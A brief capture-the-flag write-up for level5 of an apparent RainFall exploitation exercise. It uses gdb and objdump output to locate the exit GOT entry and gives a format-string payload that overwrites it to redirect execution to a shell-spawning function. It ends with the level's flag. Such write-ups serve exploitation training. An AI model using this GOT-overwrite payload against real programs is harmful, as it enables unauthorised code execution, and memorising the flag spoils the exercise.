# LEVEL5

The code uses the exit() function, so it is not possible to use the buffer overflow vulnerability on $eip to execute a command in the return of the function, we will be able to use the GOT vulnerability (Global Offset Table / overwriting GOT)

```
   0x080484ff <+61>:	call   ´ <exit@plt>

(gdb) disas 0x80483d0
Dump of assembler code for function exit@plt:
   0x080483d0 <+0>:	jmp    *0x8049838
   0x080483d6 <+6>:	push   $0x28´
   0x080483db <+11>:	jmp    0x8048370
End of assembler dump.
```

or 

```
level5@RainFall:~$ objdump -R level5 

level5:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE 
08049814 R_386_GLOB_DAT    __gmon_start__
08049848 R_386_COPY        stdin
08049824 R_386_JUMP_SLOT   printf
08049828 R_386_JUMP_SLOT   _exit
0804982c R_386_JUMP_SLOT   fgets
08049830 R_386_JUMP_SLOT   system
08049834 R_386_JUMP_SLOT   __gmon_start__
08049838 R_386_JUMP_SLOT   exit
0804983c R_386_JUMP_SLOT   __libc_start_main
```

```
o();
0x080484a4

(gdb) p 0x080484a4
$2 = 134513828
```

```
(python -c 'print("\x38\x98\x04\x08" + "%134513824x" + "%4$n")' ; cat) | ./level5
```


flag : d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31

